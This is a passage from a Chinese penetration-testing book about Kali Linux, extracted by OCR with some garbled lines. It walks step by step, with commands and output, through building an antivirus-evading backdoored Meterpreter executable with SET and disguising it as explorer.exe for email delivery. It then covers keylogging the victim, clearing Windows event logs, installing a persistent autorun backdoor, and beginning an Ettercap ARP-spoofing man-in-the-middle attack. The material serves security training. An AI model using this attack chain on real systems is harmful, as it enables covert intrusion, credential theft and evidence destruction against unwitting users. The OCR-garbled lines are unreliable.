15) Pylnjector Shellcode Injection
This will drop a meterpreter
payload through Pylnjector
16) MultiPylnjector Shellcode Injection
This will drop multiple
Metasploit payloads via memory
17) Import your own executable
Specify a path for your own
executable
输出的信息显示了可生成的所有攻击载荷，此时根据自己的目标系统选择相应的攻击
载荷。
（4）本例中攻击的目标系统为WindowsXP32位，所以这里选择编号2。如下所示：
set:payloads>2
Budo/buoed jeuoippe op o peau Kew no人 A Aq dn paxd jeb s jsou
in order to get around basic AV detection.
1) shikata_ga_nai
2) No Encoding
3) Multi-Encoder
4) Backdoored Executable
输出的信息显示了获取基于AV攻击的几种方法。
· 208 ·
---
## Page 221
第7章权限提升
（5）这里选择第4种，输入编号4，如下所示：
set:encoding>4
set:payloads> PORT of the listener [443]:
#设置监听的端口号
[-] Backdooring a legit executable to bypass Anti-Virus.Wait a few seconds...
[*] Backdoor completed successfully. Payload is now hidden within a legit executable.
[*] Your payload is now in the root directory of SET as payload.exe
[-] The payload can be found in the SET home directory.
set> Start the listener now? [yes|no]: yes
#现在启用监听的端口号
[-] Please wait while the Metasploit listener is loaded..
***[-]
[-] * WARNING: Database support has been disabled
***[]
#cowsay++
（00）
11--1| *
Save your shells from AV! Upgrade to advanced AV evasion using dynamic
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
[*]Processing /root/.set/meta_config for ERB directives. m]
H
resource (/root.set/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root.set/meta_config)> set LHOST 192.168.41.234
LHOST => 192.168.41.234
resource (/root/.set/meta_config)> set LPORT 443
LPORT => 443
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 192.168.41.234:443
[*] Starting the payload handler..
输出的信息显示了设置社会工程学的一个过程，在该过程中将指定的IP地址与端口进
行了绑定，并且打开了一个handler。这里将IP地址与端口进行绑定，是因为一个主机上
可能存在多个网卡，但是端口号是不变的。这样启动监听器后攻击主机将等待被渗透攻击
的系统来连接，并负责处理这些网络连接。
7.3.2传递攻击载荷给目标系统
攻击载荷（Payload）指的是用户期望目标系统在被渗透攻击之后执行的代码。在
Metasploit框架中可以自由地选择、传送和植入。例如，反弹式Shell是一种从目标主机到
· 209 *
---
## Page 222
第3篇各种渗透测试
攻击主机创建网络连接，并提供命令行Shell的攻击载荷，而BindShell攻击载荷则在目标
系统上将命令行Shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得Shell
交互。攻击载荷也可能是简单的在目标系统上执行一些命令，如添加用户账号等。下面将
介绍创建攻击载荷给目标系统的方法。
传递攻击载荷给目标系统。具体操作步骤如下所示。
（1）社会工程学工具默认安装在/usr/share/set下，在该目录中有一个EXE文件，名为
payload.exe。在渗透测试时为了避免被目标主机用户发现，建议修改该文件名，然后再发
送给其他人。发送给其他人的方法很多，如邮件和存储在优盘等。首先切换到/usr/share/set
目录中，查看该目录下的文件。执行命令如下所示：
root@kali:~# cd /usr/share/set/
root@kali:/usr/share/set# Is
modulesreadme
seautomatesetoolkit seupdate src
configpayload.exeREADME.txtseproxysetup.pyseweb
从以上内容中可以看到有一个名为payload.exe的文件。接下来可以修改该文件的名为
explorer.exe，然后发送给其他人。
（2）修改payload.exe文件名。执行命令如下所示：
root@kali:/usr/share/set# mv payload.exe explorer.exe
root@kali:/usr/share/set# Is
从以上内容可以看到，目前只有一个名为explorer.exe文件。
（3）将该文件传递给其他人。如果使用邮件的形式传递，需要将该文件进行压缩。因
为邮件不支持发送EXE文件。可以使用ZIP命令压缩该文件，如下所示：
root@kali:/usr/share/set# zip healthfiles explorer.exe
adding:explorer.exe (deflated 88%)
从输入内容可以看到，explorer.cexe文件被成功压缩。此时，就可以通过邮件的形式发
送给其他人。当该内容被目标系统中的用户打开后，将会与攻击者建立一个活跃的会话。
如下所示：
msf exploit(handler) >
[*] Sending stage (769024 bytes) to 192.168.41.146
19:25:43 +0800
看到以上内容，表示目标系统与攻击者成功建立了会话。现在，攻击者就可以在目标
系统上做自已想要做的事。
7.3.3收集目标系统数据
在前面介绍了将攻击载荷传递给目标系统，并成功建立会话。当成功建立会话后，攻
击者可以从目标系统中收集其数据。收集目标系统的数据，使用户尽可能使用这些信息做
进一步渗透攻击。下面将介绍收集目标系统的数据。收集目标系统数据的具体操作步骤如
·210 ·
---
## Page 223
第7章权限提升
下所示。
（1）激活Meterpreter会话。执行命令如下所示：
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1..
（2）开启键盘记录器。执行命令如下所示：
meterpreter > keyscan_start
Starting the keystroke sniffer...
（3）收集目标系统中的数据。执行命令如下所示：
meterpreter > keyscan_dump
Dumping captured keystrokes..
从输出的信息可以看到，目标系统执行过回车键、输入了数字1、2和34等。
7.3.4清除踪迹
当攻击者入侵目标系统后，做的任何操作都可能会被记录到目标系统的日志文件中。
为了不被目标系统所发现，清除踪迹是非常重要的工作。因为如果被发现，可能带来很大
的麻烦。现在用户不用担心这个问题了，因为Metasploit提供了一种方法可以很容易的来
清除所有踪迹。下面将介绍使用Metasploit清除踪迹的方法。使用Metasploit清除踪迹的
具体操作步骤如下所示。
msf exploit(handler) > sessions -i 1
[▪] Starting interaction with 1...
（2）在Metasploit中的irb命令可以清除踪迹。执行命令如下所示：
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>>
输出的信息中看到>>提示符，表示成功运行了irb命令。
（3）设置想要制除的日志。常用的日志选项如下所示：
log = client.sys.eventlog.open(system):
log = client.sys.eventlog.open(security);
log = client.sys.eventlog.open(application');
log = client.sys.eventlog.open(directory service);
log = client.sys.eventlog.open('dns server):
log = client.sys.eventlog.open(file replication service')。
这里清除所有日志。执行命令如下所示：
>> log = client.sys.eventlog.open(*system')
>> log = client.sys.eventlog.open('security')
>>log = client.sys.eventlog.open('application')
· 211 *
---
## Page 224
第3篇各种渗透测试
>> log = client.sys.eventlog.open('directory service')
>> log = client.sys.eventlog.open(dns server)
>> log = client.sys.eventlog.open(file replication service')
执行以上命令后，表示指定了要清除的日志。接下来需要执行log.clear命令才可以清
除日志文件。执行命令如下所示：
>>log.clear
执行以上命令后，将会隐藏用户的踪迹。
7.3.5创建持久后门
当成功获取目标系统的访问权限后，需要寻找方法来恢复与目标主机的连接，而无需
再进入目标系统。如果目标用户破坏了该连接，例如重新启动计算机，此时使用后门将允
许自动重新与目标系统建立连接。为了后续渗透方便，所以需要创建一个后门。这样，即
使连接被中断，也不会影响工作。下面将介绍创建持久后门。创建持久后门的具体操作步
骤如下所示。
（1）激活Meterpreter会话。执行命令如下所示：
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
（2）创建持久后门之前，先查看下它的帮助文件。执行命令如下所示：
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
-A
Automatically start a matching multi/handler to connect to the agent
-L 
Location in target host where to write payload to, if none %TEMP% will be used.
-P Payload to use, default is windows/meterpreter/reverse_tcp.
-S
Automatically start the agent on boot as a service (with SYSTEM privileges)
1-
Alternate executable template to use
-U
Automatically start the agent when the User logs on
-X
Automatically start the agent when the system boots
-h
This help menu
！-
The interval in seconds between each connection attempt
-p The port on the remote host where Metasploit is listening
-r The IP of the system running Metasploit listening for the connect back
以上信息显示了持久后门的一些选项。使用不同的选项，来设置后门。
（3）创建一个持久后门。执行命令如下所示：
meterpreter > run persistence -U -A -i 10 - 8090 -r 192.168.41.234
[*] Running Persistance Script
[] Resource file for cleanup created at /root/.msf4/logs/persistence/
AA-886OKJM26FSW_20140507.2857/AA-886OKJM26FSW_20140507.2857.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.41.234 LPORT=4444
[*] Persistent agent script is 148405 bytes long
[+]Persistent Script written to C:IDOCUME~1\Test\LOCALS~1\Temp\IzXBdJvcpnD.vbs
[] Starting connection handler at port 4444 for windows/meterpreter/reverse_tcp
[+] Multi/Handler started!
• 212 ·
---
## Page 225
第7章权限提升
[*]Executing script C:IDOCUME~1\Test\ILOCALS~1\Temp\lzXBdJvcpnD.vbs
[+]AgentexecutedwithPID1612
[*] Installing into autorun as HKCUISoftware\MicrosoftiWindows
CurrentVersion\Run`mERugsle
[+] Installed into autorun as HKCU\Software\MicrosoftiWindows
CurrentVersion\Run\mERugsle
输出的信息显示了创建后门的一个过程。在以上信息中可以看到，在目标系统中创建
了一个持久脚本，保存在C:DOCUME~1\TestLOCALS~1\Temp\IzXBdJvcpnD.vbs。并且，
该脚本会自动在目标主机上运行，此时将会建立第二个Meterpreter会话。如下所示：
meterpreter > [±] Meterpreter session 2 opened (192.168.41.234:443 -> 192.168.41.146:1032) at
2014-05-07 16:25:47 +0800
看到以上的输出信息，表示该持久后门已创建成功。
7.3.6中间人攻击（MlTM）
中间人攻击（ManintheMiddleAttack，简称“MITM攻击”）是一种间接的入侵攻击。
这种攻击模式是通过各种技术手段，将受入侵者控制的一台计算机虚拟放置在网络连接中
的两台通信计算机之间，这台计算机就称为“中间人”。下面将介绍使用Ettercap工具实
现中间人攻击。
1.存在的漏洞
学社
前面介绍了中间人攻击是通过使用各种技术手段对目标主机进行攻击的。主机既然被
攻击，则说明在传输数据的过程中存在有漏洞。接下来就分析一下所存在的漏洞。
当主机之间进行通信时，通过封装数据包进而转发到目标主机上。转发的数据包中包
括源IP地址、目标IP地址及MAC地址。但是当主机在自已的缓存表中找不到目标主机
的地址时，它会发送ARP广播，在此过程中就可能被其他攻击者冒充目标主机。
2.ARP欺骗原理
实施中间人攻击时，攻击者常考虑的方式是ARP欺骗或DNS欺骗等。下面以常见ARP
欺骗为例，分别介绍一下ARP欺骗原理。
一般情况下，ARP欺骗并不是使网络无法正常通信，而是通过冒充网关或其他主机使
得到达网关或主机的数据流通过攻击主机进行转发。通过转发流量可以对流量进行控制和
查看，从而控制流量或得到机密信息。ARP欺骗主机的流程如图7.2所示。
如图7.2所示，当主机A和主机B之间通信时，如果主机A在自己的ARP缓存表中
没有找到主机B的MAC地址时，主机A将会向整个局域网中所有计算机发送ARP广播，
广播后整个局域网中的计算机都收到了该数据。这时候，主机C响应主机A，说我是主机
B，我的MAC地址是XX-XX-XX-XX-XX-XX，主机A收到地址后就会重新更新自己的缓
冲表。当主机A再次与主机B通信时，该数据将被转发到攻击主机（主机C）上，则该数
据流会经过主机C转发到主机B。
· 213 *
---
## Page 226
第3篇
各种渗透测试
主机A到主机B的流量需要经过PC3转发
主机A
主机B
我是主机B，我的MAC地址
我是主机A·我的MAC地址
是 XX-XX-XX-XX-XX-XX
是XX-XX-XX-XX-XX-XX
（主机C的MAC地址）
（主机C的MAC地址）
主机C
图7.2ARP欺骗主机
3.中间人攻击
实现中间人攻击分为两个阶段。第一是通过某种手段去攻击一台计算机：第二是欺骗
主机。这两个阶段工作工程如图7.3和图7.4所示。
第一阶段：
ARP注入攻击
主机A
主机B（攻击者）
图7.3ARP注入攻击
在该阶段主机B通过ARP注入攻击的方法以实现ARP欺骗，通过ARP欺骗的方法
控制主机A与其他主机间的流量及机密信息。
第二阶段：
在第一个阶段攻击成功后，主机B就可以在这个网络中使用中间人的身份，转发或查
看主机A和其他主机间的数据流，如图7.4所示。
请求
伪造ARP应答报文
主机A
主机B（攻击者）
主机C
图7.4中间人攻击机制
• 214 ·
---
## Page 227
第7章权限提升
（1）在这个局域网中当主机A向主机C发送请求，此时该数据将被发送到主机B上。
（2）主机A发送给主机C的数据流将会经主机B转发到主机C上。
（3）主机C收到数据以为是主机A直接发送的。此时主机C将响应主机A的请求，
同样的该数据流将会被主机B转发到主机A上。
（4）主机A收到响应后，将登录主机C。这样主机A登录时的用户名及密码，将会被
主机B查看到。
使用Ettercap工具实现中间人攻击。具体操作步骤如下所示。
（1）启动Ettercap工具。执行命令如下所示：
root@kali:~#ettercap-G
执行以上命令后，将显示如图7.5所示的界面。
ettercap O.8.0
-□x
File Sniff Options
Ettencap
图7.5Etercap启动界面
（2）该界面是Ettercap工具的初始界面。接下来通过抓包的方法实现中间人攻击。在
菜单栏中依次选择SnifUnifiedsniffing命令或按下Shift+U组合键，将显示如图7.6所示
的界面。
ettercap 0.8.0
-ox
File
Options7
Unified sniffing
Shift+U
Bridged sniffing
Shift+B
Set pcap filter.
图7.6启动噢探
（3）在该界面单击Unifiedsniffing命令后，将显示如图7.7所示的界面。
· 215 ·
---
## Page 228
第3篇各种渗透测试
ettercapInput
确定（O）
取消（C)
图7.7选择接口
所示的界面。
ettercap 0.8.0
x
StartTargetsHostsViewMitmFiltersLoggingPlugins?
Ettercap
su6nd Ef
42 protocol dissectors
57 ports monitored
16074 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
图7.8启动接口界面
（5）启动接口后，就可以扫描所有的主机了。在菜单栏中依次选择HostsScanforhosts
命令或按下Ctrl+S组合键，如图7.9所示。
ettercap 0.8.0
Start Targets
View MitmFiters LoggingPlugins7
Hosts list
H
Scan for hosts
Ctrl+S
Load from file..
Ctrl+O
Save to file.
Ctrl+S
图7.9启动扫描主机
（6）在该界面单击Scanforhosts命令后，将显示如图7.10所示的界面。
（7）从该界面输出的信息可以看到共扫描到五台主机。如果要查看扫描到主机的信息，
在菜单栏中依次选择HostsHostslist命令或按下H键，如图7.11所示。
（8）在该界面单击Hostslist命令后，将显示如图7.12所示的界面。
· 216 ·
---
## Page 229
第7章权限提升
ettercap 0.8.0